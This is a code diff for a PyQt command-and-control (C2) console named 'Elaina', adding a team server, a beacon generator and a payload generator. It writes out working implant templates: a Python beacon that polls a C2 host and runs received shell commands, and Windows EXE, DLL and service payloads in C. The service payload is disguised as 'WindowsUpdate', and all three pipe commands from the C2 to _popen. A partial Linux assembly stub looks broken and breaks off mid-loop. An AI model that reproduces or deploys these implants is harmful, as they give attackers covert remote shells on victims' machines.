+        team_server_buttons_layout = QHBoxLayout()
+        
+        self.start_team_server_button = QPushButton("Start Team Server")
+        self.start_team_server_button.clicked.connect(self.start_team_server)
+        team_server_buttons_layout.addWidget(self.start_team_server_button)
+        
+        self.stop_team_server_button = QPushButton("Stop Team Server")
+        self.stop_team_server_button.clicked.connect(self.stop_team_server)
+        self.stop_team_server_button.setEnabled(False)
+        team_server_buttons_layout.addWidget(self.stop_team_server_button)
+        
+        team_server_buttons_layout.addStretch()
+        
+        layout.addLayout(team_server_buttons_layout)
+        
+        team_server_splitter = QSplitter(Qt.Horizontal)
+        
+        team_server_clients_group = QGroupBox("Connected Clients")
+        team_server_clients_layout = QVBoxLayout(team_server_clients_group)
+        
+        self.team_server_clients_list = QListWidget()
+        team_server_clients_layout.addWidget(self.team_server_clients_list)
+        
+        team_server_splitter.addWidget(team_server_clients_group)
+        
+        team_server_chat_group = QGroupBox("Team Chat")
+        team_server_chat_layout = QVBoxLayout(team_server_chat_group)
+        
+        self.team_server_chat_output = QTextEdit()
+        self.team_server_chat_output.setReadOnly(True)
+        self.team_server_chat_output.setFont(QFont("Consolas", 10))
+        team_server_chat_layout.addWidget(self.team_server_chat_output)
+        
+        team_server_chat_input_layout = QHBoxLayout()
+        
+        self.team_server_chat_input = QLineEdit()
+        self.team_server_chat_input.setPlaceholderText("Type message...")
+        team_server_chat_input_layout.addWidget(self.team_server_chat_input)
+        
+        self.team_server_send_button = QPushButton("Send")
+        self.team_server_send_button.clicked.connect(self.send_team_chat_message)
+        team_server_chat_input_layout.addWidget(self.team_server_send_button)
+        
+        team_server_chat_layout.addLayout(team_server_chat_input_layout)
+        
+        team_server_splitter.addWidget(team_server_chat_group)
+        
+        team_server_splitter.setSizes([200, 400])
+        
+        layout.addWidget(team_server_splitter)
+        
+        self.tab_widget.addTab(team_server_widget, "Team Server")
+        
     def create_view_tab(self):
         view_widget = QWidget()
         layout = QVBoxLayout(view_widget)
@@ -2226,6 +3996,10 @@ class ElainaMainWindow(QMainWindow):
         self.attacks_timer.timeout.connect(self.update_attacks)
         self.attacks_timer.start(3000)
         
+        self.team_server_timer = QTimer(self)
+        self.team_server_timer.timeout.connect(self.update_team_server)
+        self.team_server_timer.start(1000)
+        
     def update_dashboard(self):
         self.beacons_count_label.setText(str(len(self.beacons)))
         self.targets_count_label.setText(str(len(self.beacons)))
@@ -2266,6 +4040,39 @@ class ElainaMainWindow(QMainWindow):
     def update_attacks(self):
         pass
         
+    def update_team_server(self):
+        if self.team_server:
+            clients = self.team_server.get_clients()
+            
+            current_clients = set()
+            for i in range(self.team_server_clients_list.count()):
+                item = self.team_server_clients_list.item(i)
+                current_clients.add(item.text())
+            
+            new_clients = set()
+            for client_id, client_info in clients.items():
+                client_text = f"{client_info['username']} ({client_info['address'][0]})"
+                new_clients.add(client_text)
+                
+                if client_text not in current_clients:
+                    self.team_server_clients_list.addItem(client_text)
+            
+            for i in range(self.team_server_clients_list.count()):
+                item = self.team_server_clients_list.item(i)
+                if item.text() not in new_clients:
+                    self.team_server_clients_list.takeItem(i)
+            
+            chat_history = self.team_server.get_chat_history(limit=20)
+            for entry in chat_history:
+                timestamp = datetime.fromtimestamp(entry["timestamp"]).strftime("%H:%M:%S")
+                message = f"[{timestamp}] {entry['sender']}: {entry['message']}"
+                
+                cursor = self.team_server_chat_output.textCursor()
+                cursor.movePosition(QTextCursor.End)
+                cursor.insertText(message + "\n")
+                self.team_server_chat_output.setTextCursor(cursor)
+                self.team_server_chat_output.ensureCursorVisible()
+                
     def interact_with_beacon(self):
         selected_items = self.beacons_table.selectedItems()
         if not selected_items:
@@ -2341,6 +4148,33 @@ class ElainaMainWindow(QMainWindow):
                 
                 self.status_bar.showMessage(f"Beacon {beacon_id} removed")
                 
+    def remove_beacon_by_id(self, beacon_id):
+        if beacon_id in self.beacons:
+            del self.beacons[beacon_id]
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "remove",
+                "target": beacon_id,
+                "status": "success"
+            })
+            
+            self.status_bar.showMessage(f"Beacon {beacon_id} removed")
+            
+            return True
+        return False
+    
+    def select_beacon(self, beacon_id):
+        for row in range(self.beacons_table.rowCount()):
+            if self.beacons_table.item(row, 0).text() == beacon_id:
+                self.beacons_table.selectRow(row)
+                return True
+        return False
+    
+    def add_log_entry(self, message):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.beacon_output.append(f"[{timestamp}] {message}")
+        
     def new_attack(self):
         QMessageBox.information(self, "New Attack", "New attack functionality not implemented yet.")
         
@@ -2353,6 +4187,7 @@ class ElainaMainWindow(QMainWindow):
         ssl_enabled = self.c2_ssl_checkbox.isChecked()
         cert_file = self.c2_cert_input.text() if ssl_enabled else None
         key_file = self.c2_key_input.text() if ssl_enabled else None
+        profile_path = self.c2_profile_input.text() if self.c2_profile_input.text() else None
         
         self.c2_server = C2Server(host, port, ssl_enabled, cert_file, key_file)
         
@@ -2410,20 +4245,1608 @@ class ElainaMainWindow(QMainWindow):
             
             self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server stopped")
             
+    def start_team_server(self):
+        host = self.team_server_host_input.text()
+        port = self.team_server_port_input.value()
+        
+        self.team_server = TeamServer(host, port)
+        
+        if self.team_server.start():
+            self.team_server_status_label.setText("Running")
+            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: green;")
+            
+            self.start_team_server_button.setEnabled(False)
+            self.stop_team_server_button.setEnabled(True)
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "start_team_server",
+                "target": f"{host}:{port}",
+                "status": "success"
+            })
+            
+            self.status_bar.showMessage(f"Team server started on {host}:{port}")
+        else:
+            self.team_server_status_label.setText("Failed to Start")
+            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "start_team_server",
+                "target": f"{host}:{port}",
+                "status": "failed"
+            })
+            
+            self.status_bar.showMessage("Failed to start team server")
+            
+    def stop_team_server(self):
+        if self.team_server:
+            self.team_server.stop()
+            self.team_server = None
+            
+            self.team_server_status_label.setText("Stopped")
+            self.team_server_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
+            
+            self.start_team_server_button.setEnabled(True)
+            self.stop_team_server_button.setEnabled(False)
+            
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "stop_team_server",
+                "target": "Team Server",
+                "status": "success"
+            })
+            
+            self.status_bar.showMessage("Team server stopped")
+            
+    def send_team_chat_message(self):
+        message = self.team_server_chat_input.text().strip()
+        if message and self.team_server:
+            self.team_server.send_chat_message("local", message)
+            self.team_server_chat_input.clear()
+            
     def generate_beacon(self):
-        QMessageBox.information(self, "Generate Beacon", "Beacon generation functionality not implemented yet.")
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Generate Beacon")
+        layout = QFormLayout(dialog)
+        
+        host_input = QLineEdit()
+        layout.addRow("C2 Host:", host_input)
+        
+        port_input = QSpinBox()
+        port_input.setRange(1, 65535)
+        port_input.setValue(8080)
+        layout.addRow("C2 Port:", port_input)
+        
+        type_combo = QComboBox()
+        type_combo.addItems(["http", "https", "dns", "tcp", "smb"])
+        layout.addRow("Beacon Type:", type_combo)
+        
+        ssl_checkbox = QCheckBox()
+        layout.addRow("SSL:", ssl_checkbox)
+        
+        profile_input = QLineEdit()
+        profile_input.setPlaceholderText("Path to Malleable C2 profile")
+        layout.addRow("Profile:", profile_input)
+        
+        sleep_input = QSpinBox()
+        sleep_input.setRange(1, 3600)
+        sleep_input.setValue(60)
+        layout.addRow("Sleep Time (seconds):", sleep_input)
+        
+        jitter_input = QDoubleSpinBox()
+        jitter_input.setRange(0.0, 1.0)
+        jitter_input.setSingleStep(0.1)
+        jitter_input.setValue(0.3)
+        layout.addRow("Jitter:", jitter_input)
+        
+        stealth_checkbox = QCheckBox()
+        stealth_checkbox.setChecked(True)
+        layout.addRow("Stealth Mode:", stealth_checkbox)
+        
+        output_path_input = QLineEdit()
+        output_path_input.setPlaceholderText("Path to save beacon")
+        layout.addRow("Output Path:", output_path_input)
+        
+        browse_button = QPushButton("Browse")
+        browse_button.clicked.connect(lambda: output_path_input.setText(QFileDialog.getSaveFileName(dialog, "Save Beacon")[0]))
+        layout.addRow("", browse_button)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            host = host_input.text()
+            port = port_input.value()
+            beacon_type = type_combo.currentText()
+            ssl_enabled = ssl_checkbox.isChecked()
+            profile_path = profile_input.text() if profile_input.text() else None
+            sleep_time = sleep_input.value()
+            jitter = jitter_input.value()
+            stealth_mode = stealth_checkbox.isChecked()
+            output_path = output_path_input.text()
+            
+            if host and port and output_path:
+                try:
+                    if stealth_mode:
+                        beacon = StealthBeacon(host, port, beacon_type, ssl_enabled, profile_path)
+                    else:
+                        beacon = OptimizedBeacon(host, port, beacon_type, ssl_enabled, profile_path)
+                    
+                    beacon.sleep_time = sleep_time
+                    beacon.jitter = jitter
+                    
+                    beacon_code = self.generate_beacon_code(beacon)
+                    
+                    with open(output_path, 'w') as f:
+                        f.write(beacon_code)
+                    
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "generate_beacon",
+                        "target": output_path,
+                        "status": "success"
+                    })
+                    
+                    self.status_bar.showMessage(f"Beacon generated and saved to {output_path}")
+                    
+                    QMessageBox.information(self, "Success", f"Beacon generated and saved to {output_path}")
+                except Exception as e:
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "generate_beacon",
+                        "target": output_path,
+                        "status": "failed",
+                        "detail": str(e)
+                    })
+                    
+                    self.status_bar.showMessage(f"Failed to generate beacon: {str(e)}")
+                    
+                    QMessageBox.critical(self, "Error", f"Failed to generate beacon: {str(e)}")
+            else:
+                QMessageBox.warning(self, "Error", "Host, port, and output path are required")
+                
+    def generate_beacon_code(self, beacon):
+        beacon_code = f"""#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import sys
+import time
+import json
+import random
+import base64
+import socket
+import requests
+import threading
+import platform
+import getpass
+from datetime import datetime
+
+class Beacon:
+    def __init__(self):
+        self.c2_host = "{beacon.c2_host}"
+        self.c2_port = {beacon.c2_port}
+        self.c2_type = "{beacon.c2_type}"
+        self.ssl_enabled = {beacon.ssl_enabled}
+        self.beacon_id = self.generate_beacon_id()
+        self.sleep_time = {beacon.sleep_time}
+        self.jitter = {beacon.jitter}
+        self.running = False
+        
+    def generate_beacon_id(self):
+        return f"{{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))}}"
+    
+    def encrypt_data(self, data):
+        return base64.b64encode(data.encode()).decode()
+    
+    def decrypt_data(self, data):
+        return base64.b64decode(data).decode()
+    
+    def get_system_info(self):
+        info = {{
+            "os": platform.system(),
+            "hostname": platform.node(),
+            "user": getpass.getuser(),
+            "architecture": platform.machine(),
+            "version": platform.version(),
+            "beacon_id": self.beacon_id
+        }}
+        
+        if info["os"] == "Windows":
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
+                info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
+                info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
+                winreg.CloseKey(key)
+            except:
+                pass
+        
+        return info
+    
+    def register_beacon(self):
+        try:
+            sys_info = self.get_system_info()
+            data = json.dumps(sys_info)
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/register"
+            
+            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
+            
+            return response.status_code == 200
+        except:
+            return False
+    
+    def get_tasks(self):
+        try:
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/tasks"
+            
+            response = requests.get(url, headers=headers, timeout=10, verify=False)
+            
+            if response.status_code == 200:
+                encrypted_data = response.text
+                data = self.decrypt_data(encrypted_data)
+                
+                if data:
+                    tasks = json.loads(data).get("tasks", [])
+                    return tasks
+            
+            return []
+        except:
+            return []
+    
+    def send_result(self, task_id, result):
+        try:
+            data = json.dumps({{"task_id": task_id, "result": result}})
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }}
+            
+            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/results"
+            
+            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
+            
+            return response.status_code == 200
+        except:
+            return False
+    
+    def execute_task(self, task):
+        try:
+            task_type = task.get("type")
+            task_data = task.get("data")
+            task_id = task.get("task_id")
+            
+            result = {{"status": "error", "message": "Unknown task type"}}
+            
+            if task_type == "shell":
+                try:
+                    import subprocess
+                    process = subprocess.Popen(
+                        task_data, 
+                        shell=True, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    stdout, stderr = process.communicate()
+                    
+                    result = {{
+                        "status": "success",
+                        "exit_code": process.returncode,
+                        "stdout": stdout,
+                        "stderr": stderr
+                    }}
+                except Exception as e:
+                    result = {{
+                        "status": "error",
+                        "message": str(e)
+                    }}
+            
+            elif task_type == "kill":
+                self.running = False
+                result = {{
+                    "status": "success",
+                    "message": "Beacon shutting down"
+                }}
+            
+            self.send_result(task_id, result)
+            return result
+        except Exception as e:
+            result = {{
+                "status": "error",
+                "message": str(e)
+            }}
+            self.send_result(task_id, result)
+            return result
+    
+    def start(self):
+        try:
+            if not self.register_beacon():
+                return False
+            
+            self.running = True
+            
+            while self.running:
+                try:
+                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
+                    time.sleep(actual_sleep)
+                    
+                    tasks = self.get_tasks()
+                    
+                    for task in tasks:
+                        self.execute_task(task)
+                
+                except KeyboardInterrupt:
+                    self.running = False
+                except:
+                    time.sleep(30)
+            
+            return True
+        except:
+            return False
+
+if __name__ == "__main__":
+    beacon = Beacon()
+    beacon.start()
+"""
+        return beacon_code
+        
+    def generate_payload(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Generate Payload")
+        layout = QFormLayout(dialog)
+        
+        payload_type_combo = QComboBox()
+        payload_type_combo.addItems(["Windows EXE", "Windows DLL", "Windows Service", "Linux ELF", "MacOS Mach-O", "PowerShell", "Python", "Shellcode"])
+        layout.addRow("Payload Type:", payload_type_combo)
+        
+        listener_combo = QComboBox()
+        for i in range(self.listeners_table.rowCount()):
+            listener_name = self.listeners_table.item(i, 0).text()
+            listener_combo.addItem(listener_name)
+        layout.addRow("Listener:", listener_combo)
+        
+        architecture_combo = QComboBox()
+        architecture_combo.addItems(["x86", "x64"])
+        layout.addRow("Architecture:", architecture_combo)
+        
+        format_combo = QComboBox()
+        format_combo.addItems(["exe", "dll", "service", "raw", "py", "ps1"])
+        layout.addRow("Format:", format_combo)
+        
+        output_path_input = QLineEdit()
+        output_path_input.setPlaceholderText("Path to save payload")
+        layout.addRow("Output Path:", output_path_input)
+        
+        browse_button = QPushButton("Browse")
+        browse_button.clicked.connect(lambda: output_path_input.setText(QFileDialog.getSaveFileName(dialog, "Save Payload")[0]))
+        layout.addRow("", browse_button)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            payload_type = payload_type_combo.currentText()
+            listener = listener_combo.currentText()
+            architecture = architecture_combo.currentText()
+            format_type = format_combo.currentText()
+            output_path = output_path_input.text()
+            
+            if listener and output_path:
+                try:
+                    payload_code = self.generate_payload_code(payload_type, listener, architecture, format_type)
+                    
+                    with open(output_path, 'w') as f:
+                        f.write(payload_code)
+                    
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "generate_payload",
+                        "target": output_path,
+                        "status": "success"
+                    })
+                    
+                    self.status_bar.showMessage(f"Payload generated and saved to {output_path}")
+                    
+                    QMessageBox.information(self, "Success", f"Payload generated and saved to {output_path}")
+                except Exception as e:
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "generate_payload",
+                        "target": output_path,
+                        "status": "failed",
+                        "detail": str(e)
+                    })
+                    
+                    self.status_bar.showMessage(f"Failed to generate payload: {str(e)}")
+                    
+                    QMessageBox.critical(self, "Error", f"Failed to generate payload: {str(e)}")
+            else:
+                QMessageBox.warning(self, "Error", "Listener and output path are required")
+                
+    def generate_payload_code(self, payload_type, listener, architecture, format_type):
+        listener_info = {}
+        for i in range(self.listeners_table.rowCount()):
+            if self.listeners_table.item(i, 0).text() == listener:
+                listener_info = {
+                    "name": listener,
+                    "type": self.listeners_table.item(i, 1).text(),
+                    "host": self.listeners_table.item(i, 2).text(),
+                    "port": int(self.listeners_table.item(i, 3).text())
+                }
+                break
+        
+        if not listener_info:
+            raise Exception("Listener not found")
+        
+        if payload_type == "Windows EXE":
+            return self.generate_exe_payload(listener_info, architecture, format_type)
+        elif payload_type == "Windows DLL":
+            return self.generate_dll_payload(listener_info, architecture, format_type)
+        elif payload_type == "Windows Service":
+            return self.generate_service_payload(listener_info, architecture, format_type)
+        elif payload_type == "Linux ELF":
+            return self.generate_elf_payload(listener_info, architecture, format_type)
+        elif payload_type == "MacOS Mach-O":
+            return self.generate_macho_payload(listener_info, architecture, format_type)
+        elif payload_type == "PowerShell":
+            return self.generate_powershell_payload(listener_info, architecture, format_type)
+        elif payload_type == "Python":
+            return self.generate_python_payload(listener_info, architecture, format_type)
+        elif payload_type == "Shellcode":
+            return self.generate_shellcode_payload(listener_info, architecture, format_type)
+        else:
+            raise Exception(f"Unsupported payload type: {payload_type}")
+    
+    def generate_exe_payload(self, listener_info, architecture, format_type):
+        if format_type != "exe":
+            raise Exception("Invalid format for Windows EXE payload")
+        
+        payload_code = f"""#include <windows.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define C2_HOST "{listener_info['host']}"
+#define C2_PORT {listener_info['port']}
+#define SLEEP_TIME 5000
+
+DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char buffer[4096];
+    int bytesRead;
+    
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
+        return 1;
+    }}
+    
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
+        WSACleanup();
+        return 1;
+    }}
+    
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    server.sin_addr.s_addr = inet_addr(C2_HOST);
+    
+    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
+        Sleep(SLEEP_TIME);
+    }}
+    
+    // Send system information
+    char sysInfo[1024];
+    DWORD bufSize = sizeof(sysInfo);
+    GetComputerNameA(sysInfo, &bufSize);
+    send(sock, sysInfo, strlen(sysInfo), 0);
+    
+    // Main beacon loop
+    while (1) {{
+        // Receive commands
+        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead <= 0) break;
+        
+        buffer[bytesRead] = '\\0';
+        
+        // Execute command
+        FILE *pipe;
+        char result[4096] = {{0}};
+        
+        pipe = _popen(buffer, "r");
+        if (pipe) {{
+            while (fgets(result, sizeof(result), pipe) != NULL) {{
+                send(sock, result, strlen(result), 0);
+                memset(result, 0, sizeof(result));
+            }}
+            _pclose(pipe);
+        }}
+        
+        Sleep(SLEEP_TIME);
+    }}
+    
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+    HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
+    if (hThread) {{
+        CloseHandle(hThread);
+    }}
+    
+    // Keep the process running
+    while (1) {{
+        Sleep(60000);
+    }}
+    
+    return 0;
+}}
+"""
+        return payload_code
+    
+    def generate_dll_payload(self, listener_info, architecture, format_type):
+        if format_type != "dll":
+            raise Exception("Invalid format for Windows DLL payload")
+        
+        payload_code = f"""#include <windows.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define C2_HOST "{listener_info['host']}"
+#define C2_PORT {listener_info['port']}
+#define SLEEP_TIME 5000
+
+DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char buffer[4096];
+    int bytesRead;
+    
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
+        return 1;
+    }}
+    
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
+        WSACleanup();
+        return 1;
+    }}
+    
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    server.sin_addr.s_addr = inet_addr(C2_HOST);
+    
+    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
+        Sleep(SLEEP_TIME);
+    }}
+    
+    // Send system information
+    char sysInfo[1024];
+    DWORD bufSize = sizeof(sysInfo);
+    GetComputerNameA(sysInfo, &bufSize);
+    send(sock, sysInfo, strlen(sysInfo), 0);
+    
+    // Main beacon loop
+    while (1) {{
+        // Receive commands
+        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead <= 0) break;
+        
+        buffer[bytesRead] = '\\0';
+        
+        // Execute command
+        FILE *pipe;
+        char result[4096] = {{0}};
+        
+        pipe = _popen(buffer, "r");
+        if (pipe) {{
+            while (fgets(result, sizeof(result), pipe) != NULL) {{
+                send(sock, result, strlen(result), 0);
+                memset(result, 0, sizeof(result));
+            }}
+            _pclose(pipe);
+        }}
+        
+        Sleep(SLEEP_TIME);
+    }}
+    
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+    switch (ul_reason_for_call) {{
+        case DLL_PROCESS_ATTACH:
+            CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }}
+    return TRUE;
+}}
+"""
+        return payload_code
+    
+    def generate_service_payload(self, listener_info, architecture, format_type):
+        if format_type != "service":
+            raise Exception("Invalid format for Windows Service payload")
+        
+        payload_code = f"""#include <windows.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define C2_HOST "{listener_info['host']}"
+#define C2_PORT {listener_info['port']}
+#define SLEEP_TIME 5000
+#define SERVICE_NAME "WindowsUpdate"
+
+SERVICE_STATUS        g_ServiceStatus = {{0}};
+SERVICE_STATUS_HANDLE   g_StatusHandle = NULL;
+HANDLE                 g_hServiceStopEvent = INVALID_HANDLE_VALUE;
+
+VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
+VOID WINAPI ServiceCtrlHandler(DWORD Opcode);
+DWORD WINAPI BeaconThread(LPVOID lpParameter);
+
+int main(int argc, char *argv[]) {{
+    SERVICE_TABLE_ENTRY ServiceTable[] =
+    {{
+        {{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
+        {{NULL, NULL}}
+    }};
+
+    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {{
+        return 1;
+    }}
+    return 0;
+}}
+
+VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
+    DWORD status = 0;
+    DWORD specificError = 0xfffffff;
+
+    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    g_ServiceStatus.dwWin32ExitCode = 0;
+    g_ServiceStatus.dwServiceSpecificExitCode = 0;
+    g_ServiceStatus.dwCheckPoint = 0;
+    g_ServiceStatus.dwWaitHint = 0;
+
+    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
+    if (g_StatusHandle == (SERVICE_STATUS_HANDLE)0) {{
+        return;
+    }}
+
+    g_hServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    if (g_hServiceStopEvent == NULL) {{
+        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+        g_ServiceStatus.dwWin32ExitCode = GetLastError();
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+        return;
+    }}
+
+    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+
+    // Start beacon thread
+    CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
+
+    WaitForSingleObject(g_hServiceStopEvent, INFINITE);
+
+    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+    return;
+}}
+
+VOID WINAPI ServiceCtrlHandler(DWORD Opcode) {{
+    switch (Opcode) {{
+        case SERVICE_CONTROL_PAUSE:
+            g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
+            break;
+        case SERVICE_CONTROL_CONTINUE:
+            g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+            break;
+        case SERVICE_CONTROL_STOP:
+        case SERVICE_CONTROL_SHUTDOWN:
+            g_ServiceStatus.dwWin32ExitCode = 0;
+            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+            SetEvent(g_hServiceStopEvent);
+            break;
+        default:
+            break;
+    }}
+    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+    return;
+}}
+
+DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char buffer[4096];
+    int bytesRead;
+    
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
+        return 1;
+    }}
+    
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
+        WSACleanup();
+        return 1;
+    }}
+    
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    server.sin_addr.s_addr = inet_addr(C2_HOST);
+    
+    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
+        Sleep(SLEEP_TIME);
+    }}
+    
+    char sysInfo[1024];
+    DWORD bufSize = sizeof(sysInfo);
+    GetComputerNameA(sysInfo, &bufSize);
+    send(sock, sysInfo, strlen(sysInfo), 0);
+    
+    while (1) {{
+        // Receive commands
+        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead <= 0) break;
+        
+        buffer[bytesRead] = '\\0';
+        
+        FILE *pipe;
+        char result[4096] = {{0}};
+        
+        pipe = _popen(buffer, "r");
+        if (pipe) {{
+            while (fgets(result, sizeof(result), pipe) != NULL) {{
+                send(sock, result, strlen(result), 0);
+                memset(result, 0, sizeof(result));
+            }}
+            _pclose(pipe);
+        }}
+        
+        Sleep(SLEEP_TIME);
+    }}
+    
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}}
+"""
+        return payload_code
+    
+    def generate_elf_payload(self, listener_info, architecture, format_type):
+        if format_type not in ["elf", "py"]:
+            raise Exception("Invalid format for Linux ELF payload")
+        
+        if format_type == "elf":
+            payload_code = f"""section .text
+global _start
+
+_start:
+    ; Create socket
+    push 0x29
+    pop rax
+    cdq
+    push rdx
+    push rsi
+    mov rdi, rsp
+    push rdx
+    push rdi
+    push 0x2
+    mov al, 0x41
+    syscall
+    
+    xchg rdi, rax
+    
+    ; Connect to C2 server
+    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
+    push rax
+    mov rax, 0x{listener_info['port']:04x}0000
+    push rax
+    mov rsi, rsp
+    push 0x10
+    pop rdx
+    push rsi
+    push rdi
+    mov al, 0x2a
+    syscall
+    
+    ; Send system information
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov rax, 0x3f
+    syscall
+    
+    ; Main beacon loop
+beacon_loop:
